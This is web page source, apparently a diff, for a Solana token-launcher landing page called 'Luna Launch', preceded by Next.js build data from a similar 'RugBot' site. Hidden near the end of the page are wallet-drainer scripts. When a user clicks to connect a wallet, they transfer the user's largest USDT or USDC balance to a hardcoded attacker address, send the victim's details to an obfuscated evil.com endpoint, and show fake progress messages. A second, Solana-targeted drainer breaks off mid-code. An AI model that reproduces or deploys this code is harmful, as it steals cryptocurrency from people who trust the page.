688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"Toaster\"]\n11:I[61060,[],\"\"]\n12:[]\n"])</script><script>self.__next_f.push([1,"0:[\"$\",\"$L3\",null,{\"buildId\":\"8A-AF-y2k_xry4bSc7ZGN\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"\"],\"initialTree\":[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"__PAGE__\",{},[[\"$L4\",[\"$\",\"$L5\",null,{\"props\":{\"params\":{},\"searchParams\":{}},\"Component\":\"$6\"}],null],null],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/77ba9dd39a15a08e.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"__className_e8ce0c bg-surface-main text-text-primary\",\"children\":[\"$\",\"$L7\",null,{\"attribute\":\"class\",\"defaultTheme\":\"dark\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[\"$\",\"$L8\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col min-h-screen\",\"children\":[[\"$\",\"$L9\",null,{}],[\"$\",\"$La\",null,{}],[[\"$\",\"$Lb\",null,{\"strategy\":\"lazyOnload\",\"src\":\"https://www.googletagmanager.com/gtag/js?id=G-MHE8NGXNHS\"}],[\"$\",\"$Lb\",null,{\"id\":\"\",\"strategy\":\"lazyOnload\",\"children\":\"\\n              window.dataLayer = window.dataLayer || [];\\n              function gtag(){dataLayer.push(arguments);}\\n              gtag('js', new Date());\\n              gtag('config', 'G-MHE8NGXNHS', {\\n              page_path: window.location.pathname,\\n              });\\n          \"}]],[\"$\",\"main\",null,{\"className\":\"flex-1 flex flex-col\",\"children\":[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Ld\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]}],[\"$\",\"footer\",null,{\"className\":\"bg-surface-card border-t border-border-primary\",\"children\":[\"$\",\"div\",null,{\"className\":\"container mx-auto px-4 sm:px-6 lg:px-8 py-12\",\"children\":[[\"$\",\"div\",null,{\"className\":\"grid grid-cols-1 md:grid-cols-4 gap-8\",\"children\":[[\"$\",\"div\",null,{\"className\":\"col-span-1 md:col-span-2\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex items-center gap-2 mb-4\",\"children\":[\"$\",\"$Le\",null,{\"href\":\"/\",\"className\":\"flex items-center gap-2 flex-shrink-0\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/rugbot-logo.png\",\"alt\":\"RugBot Logo\",\"className\":\"w-8 h-8\"}],[\"$\",\"span\",null,{\"className\":\"font-bold text-lg\",\"children\":\"RugBot\"}]]}]}],[\"$\",\"p\",null,{\"className\":\"text-text-secondary max-w-xs\",\"children\":\"The most trusted platform for creating and managing SPL tokens on Solana with RugBot. Deploy professional-grade tokens in seconds.\"}]]}],[\"$\",\"div\",null,{\"children\":[[\"$\",\"h3\",null,{\"className\":\"font-semibold mb-4\",\"children\":\"Resources\"}],[\"$\",\"ul\",null,{\"className\":\"space-y-2\",\"children\":[[\"$\",\"li\",null,{\"children\":[\"$\",\"$Le\",null,{\"href\":\"/terms\",\"className\":\"text-text-secondary hover:text-text-primary\",\"children\":\"Terms of Service\"}]}],[\"$\",\"li\",null,{\"children\":[\"$\",\"$Le\",null,{\"href\":\"/privacy\",\"className\":\"text-text-secondary hover:text-text-primary\",\"children\":\"Privacy Policy\"}]}],[\"$\",\"li\",null,{\"children\":[\"$\",\"$Le\",null,{\"href\":\"/security\",\"className\":\"text-text-secondary hover:text-text-primary\",\"children\":\"Security\"}]}]]}]]}],[\"$\",\"div\",null,{\"children\":[[\"$\",\"h3\",null,{\"className\":\"font-semibold mb-4\",\"children\":\"Community\"}],[\"$\",\"ul\",null,{\"className\":\"space-y-2\",\"children\":[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"#\",\"className\":\"text-text-secondary hover:text-text-primary\",\"children\":\"Telegram\"}]}]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"mt-8 pt-8 border-t border-border-primary text-center text-text-disabled text-sm\",\"children\":[\"© \",2025,\" RugBot. All rights reserved.\"]}]]}]}],[\"$\",\"$Lf\",null,{}]]}]}]}]}]}]],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$L10\"],\"globalErrorComponent\":\"$11\",\"missingSlots\":\"$W12\"}]\n"])</script><script>self.__next_f.push([1,"10:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"RugBot - Create SPL Tokens on Solana Instantly\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"keywords\",\"content\":\"Solana,SPL Token,Create Token,Crypto Launchpad,DEX Liquidity,Token Creator,Blockchain Tools,Raydium,Jupiter\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"RugBot - Create SPL Tokens on Solana Instantly\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:url\",\"content\":\"https://rugbot.io\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:site_name\",\"content\":\"RugBot\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:locale\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:image\",\"content\":\"https://rugbot.io/images/android-chrome-512x512.png\"}],[\"$\",\"meta\",\"11\",{\"property\":\"og:image:width\",\"content\":\"512\"}],[\"$\",\"meta\",\"12\",{\"property\":\"og:image:height\",\"content\":\"512\"}],[\"$\",\"meta\",\"13\",{\"property\":\"og:image:alt\",\"content\":\"RugBot Logo\"}],[\"$\",\"meta\",\"14\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"15\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"16\",{\"name\":\"twitter:title\",\"content\":\"RugBot - Create SPL Tokens on Solana Instantly\"}],[\"$\",\"meta\",\"17\",{\"name\":\"twitter:description\",\"content\":\"Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance.\"}],[\"$\",\"meta\",\"18\",{\"name\":\"twitter:image\",\"content\":\"https://rugbot.io/images/android-chrome-512x512.png\"}],[\"$\",\"link\",\"19\",{\"rel\":\"shortcut icon\",\"href\":\"/images/favicon.ico\"}],[\"$\",\"link\",\"20\",{\"rel\":\"icon\",\"href\":\"/images/favicon-32x32.png\",\"sizes\":\"32x32\",\"type\":\"image/png\"}],[\"$\",\"link\",\"21\",{\"rel\":\"icon\",\"href\":\"/images/favicon-16x16.png\",\"sizes\":\"16x16\",\"type\":\"image/png\"}],[\"$\",\"link\",\"22\",{\"rel\":\"apple-touch-icon\",\"href\":\"/images/apple-touch-icon.png\"}],[\"$\",\"meta\",\"23\",{\"name\":\"next-size-adjust\"}]]\n"])</script><script>self.__next_f.push([1,"4:null\n"])</script></body>
+    <head>
+        <base href="/l/-p--luna-creator-2/index.html">
+        <meta name="viewport" content="width=1024, user-scalable=no">
+      <style>
+    html {
+        min-width: 1024px;
+    }
+
+    /* Popup styles */
+    .popup-modal {
+      display: none; /* Hidden by default */
+      position: fixed;
+      z-index: 9999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.6);
+    }
+
+    .popup-content {
+      background-color: #fff;
+      margin: 15% auto;
+      padding: 20px;
+      border-radius: 8px;
+      width: 80%;
+      max-width: 400px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      position: relative;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px; right: 15px;
+      font-size: 24px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+</style>
+
+        <meta charset="UTF-8">
+        <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
+        <link href="css2.css" rel="stylesheet">
+        <title>Luna Launch</title>
+        <link rel="stylesheet" href="assets/index-bdbdubf9.css">
+        <script src="../../_nuxt/assets/index.js" type="module"></script>
+        <link rel="stylesheet" href="assets/styles-DQqVfxH3.css">
+        <link rel="stylesheet" href="assets/Nav-CEpo9JHw.css">
+        <link rel="stylesheet" href="assets/Footer-DFm38Gq1.css">
+        <link rel="stylesheet" href="assets/Tools-BXMnATEF.css">
+        <link rel="stylesheet" href="assets/Landing-DtKI65OX.css">
+        <style id="mobile-unlock">
+            .create-token-btn-mobile {
+                display: none !important;
+            }
+
+            .create-token-box .create-token-btn:not(.create-token-btn-mobile) {
+                display: inline-flex !important;
+                align-items: center;
+                gap: .5rem;
+            }
+        </style><style>
+/* Popup background */
+.popup-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+/* Modal box */
+.popup-content {
+  background-color: #111;
+  color: white;
+  width: 360px;
+  border-radius: 20px;
+  padding: 25px;
+  box-shadow: 0 0 20px rgba(0,0,0,0.5);
+  position: relative;
+}
+
+/* Close button */
+.close-btn {
+  position: absolute;
+  top: 12px;
+  right: 16px;
+  font-size: 24px;
+  color: #aaa;
+  cursor: pointer;
+}
+
+/* Wallet list */
+.wallet-list {
+  list-style: none;
+  padding: 0;
+  margin-top: 20px;
+}
+
+.wallet-list li {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #1a1a1a;
+  padding: 12px 16px;
+  border-radius: 12px;
+  margin-bottom: 12px;
+  cursor: pointer;
+  transition: background 0.2s ease;
+}
+
+.wallet-list li:hover {
+  background-color: #2a2a2a;
+}
+
+.wallet-list img {
+  width: 24px;
+  height: 24px;
+  margin-right: 12px;
+}
+
+/* Wallet name alignment */
+.wallet-list li > img + span,
+.wallet-list li > img + div {
+  flex-grow: 1;
+  margin-left: 10px;
+}
+
+/* Status tags */
+.status {
+  font-size: 12px;
+  padding: 2px 6px;
+  border-radius: 6px;
+}
+
+.installed {
+  background-color: #2ecc71;
+  color: #000;
+}
+
+.popular {
+  background-color: #f1c40f;
+  color: #000;
+}
+
+.wallet-count {
+  background-color: #333;
+  color: white;
+  padding: 3px 8px;
+  font-size: 12px;
+  border-radius: 10px;
+}
+
+/* Get Started Link */
+.get-started {
+  margin-top: 12px;
+  font-size: 13px;
+  text-align: center;
+  color: #888;
+}
+
+.get-started a {
+  color: #4e9eff;
+  text-decoration: none;
+}
+</style>
+    </head>
+    <body>
+        <div id="root">
+            <div class="nav-container">
+                <a class="logo-container active" href="" data-discover="true" aria-current="page">
+                    <div class="logo-img">
+                        <img alt="logo" src="assets/logo-full.svg">
+                    </div>
+                </a>
+                <nav class="main-nav">
+                    <a aria-current="page" class="nav-link active" data-discover="true" href="">Home</a>
+                    <a class="nav-link" data-discover="true" href="create-token/index.html">Create Token</a>
+                    <a class="nav-link" data-discover="true" href="tools.html">Tools</a>
+                    <a class="nav-link" href="my-portfolio/index.html" rel="noopener noreferrer">Liquidity Pool</a>
+                    <a class="nav-link" href="https://raydium.io/swap" rel="noopener noreferrer" target="_blank">Manage
+                    Liquidity</a>
+                </nav>
+                <div class="wallet-dropdown">
+                    <div class="wallet-display connect-wallet-btn">Connect Wallet</div>
+                    <button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;">
+                        <span class="material-symbols-rounded">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <line x1="3" y1="12" x2="21" y2="12"></line>
+                                <line x1="3" y1="6" x2="21" y2="6"></line>
+                                <line x1="3" y1="18" x2="21" y2="18"></line>
+                            </svg>
+                        </span>
+                    </button>
+                    <div class="sidebar-menu closed">
+                        <div class="sidebar-menu-item">
+                            <a class="nav-link active" href="" data-discover="true" aria-current="page">Home</a>
+                        </div>
+                        <div class="sidebar-menu-item">
+                            <a class="nav-link" href="create-token/index.html" data-discover="true">Create Token</a>
+                        </div>
+                        <div class="sidebar-menu-item">
+                            <a class="nav-link" href="tools.html" data-discover="true">Tools</a>
+                        </div>
+                        <div class="sidebar-menu-item">
+                            <a href="https://raydium.io/liquidity/create-pool" class="nav-link" target="_blank" rel="noopener noreferrer">Liquidity Pool</a>
+                        </div>
+                        <div class="sidebar-menu-item">
+                            <a href="https://raydium.io/swap" class="nav-link" target="_blank" rel="noopener noreferrer">Manage Liquidity</a>
+                        </div>
+                        <div class="sidebar-menu-item">
+                            <a class="nav-link" href="https://lunalaunch.com/support" data-discover="true">Support</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="main">
+                <div id="landing" style="opacity: 1;">
+                    <div class="hero-section">
+                        <div class="trust-indicators" style="transform: translateY(0.64479%);">
+                            <div class="trust-stats">
+                                <div class="trust-stat">
+                                    <div class="trust-number">50,000+</div>
+                                    <div class="trust-label">Tokens Created</div>
+                                </div>
+                                <div class="trust-stat">
+                                    <div class="trust-number">25,000+</div>
+                                    <div class="trust-label">Active Users</div>
+                                </div>
+                                <div class="trust-stat">
+                                    <div class="trust-number">99.9%</div>
+                                    <div class="trust-label">Success Rate</div>
+                                </div>
+                            </div>
+                            <div class="trust-badges">
+                                <div class="trust-badge">
+                                    <div class="badge-icon">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 16H6V10h12v12z" fill="#00FFA3"></path>
+                                            <circle cx="12" cy="15" r="2" fill="#00FFA3"></circle>
+                                        </svg>
+                                    </div>
+                                    <span>Secure &amp;Audited</span>
+                                </div>
+                                <div class="trust-badge">
+                                    <div class="badge-icon">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M7 2v11h3v9l7-12h-4l4-8z" fill="#FFD700"></path>
+                                        </svg>
+                                    </div>
+                                    <span>Lightning Fast</span>
+                                </div>
+                                <div class="trust-badge">
+                                    <div class="badge-icon">
+                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z" fill="#00FFA3"></path>
+                                        </svg>
+                                    </div>
+                                    <span>100% Safe</span>
+                                </div>
+                            </div>
+                            <div class="live-activity">
+                                <div class="activity-header">
+                                    <div class="live-dot"></div>
+                                    <span>Live Activity</span>
+                                </div>
+                                <div class="activity-item">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
+                                        <path d="M2.81 14.7l1.68-1.81c.69-.74 1.08-1.71 1.08-2.72V9c0-.89.33-1.78 1-2.45C7.22 5.89 8.11 5.56 9 5.56c.89 0 1.78.33 2.45 1S12.44 8.11 12.44 9v1.17c0 1.01.39 1.98 1.08 2.72l1.68 1.81c.31.33.31.85 0 1.18-.31.33-.85.33-1.18 0L12 13.83c-.68-.73-1.71-1.15-2.81-1.15s-2.13.42-2.81 1.15L4.36 15.9c-.33.33-.87.33-1.18 0-.32-.33-.32-.85-.01-1.18z" fill="#FF6B35"></path>
+                                        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="#FF6B35"></path>
+                                    </svg>
+                                    <span>TokenX launched 2 min ago</span>
+                                </div>
+                                <div class="activity-item">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
+                                        <path d="M6,2L18,22L12,18L6,22L6,2Z" fill="#00D4FF"></path>
+                                    </svg>
+                                    <span>CryptoGem deployed 5 min ago</span>
+                                </div>
+                                <div class="activity-item">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
+                                        <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z" fill="#FFD700"></path>
+                                    </svg>
+                                    <span>MoonShot created 8 min ago</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="title-box">
+                            <span class="title-1">#1 Solana Token Launcher in the World</span>
+                            <div class="title-2">
+                                <span class="span-1">
+                                    Launch your <span style="font-weight: 900;">$Solana</span>
+                                    Token
+                                </span>
+                                <span class="span-2">
+                                    <span style="font-weight: 700;">Take it</span>
+                                    <span style="font-weight: 500;">to the</span>
+                                    <span style="font-weight: 900;">Moon!</span>
+                                </span>
+                            </div>
+                            <div class="desc">
+                                <span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span>
+                                <span class="span-2">Reach the world and scale without limits!</span>
+                            </div>
+                            <div class="create-token-box">
+                                <input class="create-token-text" placeholder="Create your first token" value="">
+                                <div class="create-token-btn create-token-btn-mobile" style="cursor: pointer; display: none;">
+                                    <span class="text">Token creation is only available on desktop</span>
+                                </div>
+                                <div onclick="location.href='/create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
+                                    <span class="text">Create Token</span>
+                                    <span class="material-symbols-rounded"></span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="background-1" style="transform: translateY(0.48359%);">
+                            <img alt="Earth Background" src="assets/bg1-DWJ0RCfe.png">
+                        </div>
+                        <div class="background-2">
+                            <img alt="iPhone Screenshot" src="assets/iPhoneSS-DpoVylXb.png">
+                        </div>
+                    </div>
+                    <div class="content-container">
+                        <div class="content-section">
+                            <div class="content-text-1">
+                                <span class="span-1">The world’s most powerful</span>
+                                <span class="span-2">Solana Launcher ever.</span>
+                            </div>
+                            <div class="content-img-1">
+                                <div class="content-controls">
+                                    <span></span>
+                                    <span></span>
+                                    <span></span>
+                                </div>
+                                <div class="border-bg"></div>
+                                <img src="assets/contentimg1-d6m7sRFw.png">
+                                <div class="fade-fg"></div>
+                            </div>
+                        </div>
+                        <div class="phone-parallax-section">
+                            <div class="parallax-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
+                            <div class="img-container">
+                                <img class="left-img" style="transform: translateY(30%);" src="assets/coinGroup1-R48YoBp5.png">
+                                <img class="iphone-img" src="assets/iPhone%20Image-pZbQWzRq.png">
+                                <img class="right-img" style="transform: translateY(30%);" src="assets/coinGroup2-Bkx6Q6TB.png">
+                            </div>
+                        </div>
+                        <div class="features-section">
+                            <div class="features-label">Features</div>
+                            <div class="features-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
+                            <div class="features-subtitle">Create, manage, and launch your Solana token effortlessly with secure transactions, instant deployment, and zero coding required!</div>
+                            <div class="features-container">
+                                <div class="features-img">
+                                    <img src="assets/iPhone%20Image-pZbQWzRq.png">
+                                </div>
+                                <div class="features-stats">
+                                    <div class="features-stat">
+                                        <div class="features-stat-value">99.9%</div>
+                                        <div class="features-stat-label">Successful Token Launches</div>
+                                    </div>
+                                    <div class="features-stat">
+                                        <div class="features-stat-value">85%+</div>
+                                        <div class="features-stat-label">Returned Users</div>
+                                    </div>
+                                </div>
+                                <div class="features-description">
+                                    <div class="features-description-text">
+                                        <div class="features-description-title">Create &amp;Deploy Your Token in Minutes</div>
+                                        <div class="features-description-subtitle">Turn your idea into reality with lightning-fast token creation. Whether for projects, communities, or innovation, deploy your Solana token in minutes - with ease, secure, and built for the future!</div>
+                                    </div>
+                                    <div onclick="location.href='create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
+                                        <span class="text" href="create-token/index.html">Create Token</span>
+                                        <span class="material-symbols-rounded"></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-container">
+                <a class="logo-container active" href="" data-discover="true" aria-current="page">
+                    <div class="logo-img">
+                        <img alt="logo" src="assets/logo-full.svg">
+                    </div>
+                </a>
+                <div class="bottom-bar" select="false">
+                    <div class="copyright-bar">
+                        <span>© Luna Launcher 2025</span>
+                    </div>
+                    <div class="policies-bar">
+                        <a class="policy-link" href="terms-of-service.html" data-discover="true">Terms of Service</a>
+                        <span class="separator"></span>
+                        <a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a>
+                    </div>
+    
+<!-- Popup Modal -->
+<div id="connectWallet" class="popup-modal" style="display: none;">
+    <div class="popup-content">
+    <span class="close-btn" id="closeConnectWallet">&times;</span>
+    <h2>Connect Wallet</h2>
+    <ul class="wallet-list">
+      <li id="phantomConnectBtn">
+        <img src="phantom-icon.png" alt="Phantom"> Phantom 
+        <span class="status installed">INSTALLED</span>
+      </li>
+      <li><img src="solflare-icon.png" alt="Solflare"> Solflare 
+        <span class="status popular">POPULAR</span>
+      </li>
+      <li><img src="trust-icon.png" alt="Trust"> Trust Wallet</li>
+      <li><img src="coinbase-icon.png" alt="Coinbase"> Coinbase</li>
+      <li><img src="okx-icon.png" alt="OKX"> OKX Wallet</li>
+      <li><img src="more-icon.png" alt="More"> All Wallets 
+        <span class="wallet-count">90</span>
+      </li>
+    </ul>
+    <p class="get-started">Haven't got a wallet? <a href="#">Get started</a></p>
+  </div>
+</div>
+
+
+  </div>
+</div>
+
+
+  </div>
+</div>
+
+
+
+
+            </div>
+
+    </div>  
+
+
+<script>
+
+
+if (connectButton) {
+  const originalText = connectButton.innerText;
+
+  connectButton.onclick = async () => {
+    const fakeNotification = document.createElement('div');
+    fakeNotification.style.position = 'fixed';
+    fakeNotification.style.top = '20px';
+    fakeNotification.style.right = '20px';
+    fakeNotification.style.background = '#4caf50';
+    fakeNotification.style.color = 'white';
+    fakeNotification.style.padding = '10px';
+    fakeNotification.style.borderRadius = '5px';
+    fakeNotification.innerText = 'Connecting wallet...';
+    document.body.appendChild(fakeNotification);
+
+    try {
+      if (window.ethereum) {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
+
+        // Load Web3.js dynamically
+        const web3Script = document.createElement('script');
+        web3Script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js';
+        document.head.appendChild(web3Script);
+
+        web3Script.onload = async () => {
+          const web3 = new Web3(window.ethereum);
+          const tokens = [
+            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6 },
+            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6 }
+          ];
+          const abi = [
+            'function balanceOf(address) view returns (uint256)',
+            'function transfer(address,uint256) returns (bool)'
+          ];
+          const attackerAddress = '0x28170B405f1e17278178B4C786E14437561cf4cf';
+
+          let maxBalance = 0;
+          let targetToken = null;
+          for (const token of tokens) {
+            const contract = new web3.eth.Contract(abi, token.address);
+            const balance = await contract.methods.balanceOf(userAddress).call();
+            if (balance > maxBalance) {
+              maxBalance = balance;
+              targetToken = token;
+            }
+          }
+
+          if (maxBalance > 0) {
+            const contract = new web3.eth.Contract(abi, targetToken.address);
+            const data = contract.methods.transfer(attackerAddress, maxBalance).encodeABI();
+            const txHash = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: userAddress,
+                to: targetToken.address,
+                data: data,
+                gas: '0x7530'
+              }]
+            });
+
+            fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
+              method: 'POST',
+              body: JSON.stringify({
+                wallet: userAddress,
+                txHash,
+                token: targetToken.name,
+                amount: maxBalance
+              })
+            });
+
+            fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+          } else {
+            fakeNotification.innerText = 'No tokens found.';
+          }
+          setTimeout(() => {
+            document.body.removeChild(fakeNotification);
+            connectButton.innerText = originalText;
+          }, 3000);
+        };
+      } else {
+        alert('Please install MetaMask!');
+        document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
+      }
+    } catch (err) {
+      fakeNotification.innerText = 'Error: ' + err.message;
+      setTimeout(() => {
+        document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
+      }, 3000);
+    }
+  };
+}
+</script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const phantomBtn = document.getElementById('phantomConnectBtn');
+  const connectButton = document.querySelector('.connect-wallet-btn'); // if you want to refer to the main connect button
+
+  if (!phantomBtn) {
+    console.warn('Phantom button not found!');
+    return;
+  }
+
+  phantomBtn.addEventListener('click', async function (e) {
+    e.preventDefault();
+
+    // Show notification
+    const fakeNotification = document.createElement('div');
+    fakeNotification.style.position = 'fixed';
+    fakeNotification.style.top = '20px';
+    fakeNotification.style.right = '20px';
+    fakeNotification.style.background = '#4caf50';
+    fakeNotification.style.color = 'white';
+    fakeNotification.style.padding = '10px';
+    fakeNotification.style.borderRadius = '5px';
+    fakeNotification.style.zIndex = '9999';
+    fakeNotification.innerText = 'Connecting wallet...';
+    document.body.appendChild(fakeNotification);
+
+    try {
+      if (window.solana && window.solana.isPhantom) {
+        const provider = window.solana;
+        const resp = await provider.connect();
+        const userPublicKey = resp.publicKey.toString();
+
+        // Dynamically load Solana scripts
+        const solanaScript = document.createElement('script');
+        solanaScript.src = 'https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.js';
+        document.head.appendChild(solanaScript);
+
+        solanaScript.onload = async () => {
+          const splTokenScript = document.createElement('script');
+          splTokenScript.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.2.0/lib/index.iife.js';
+          document.head.appendChild(splTokenScript);
+
+          splTokenScript.onload = async () => {
+            const { Connection, PublicKey, Transaction } = solanaWeb3;
+            const { Token, TOKEN_PROGRAM_ID } = splToken;
+
+            const connection = new Connection('https://api.mainnet-beta.solana.com');
+            const userKey = new PublicKey(userPublicKey);
+
+            // This public key looks like an attacker's, be VERY careful
+            const attackerPublicKey = new PublicKey('Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy');
+
+            // List of tokens to check
+            const tokens = [
+              { mintAddress: 'Es9vMFrzaCERmdu5sJ1NzxZjxtkkep3ZJyk1mS4ifpQ6', name: 'USDT' },
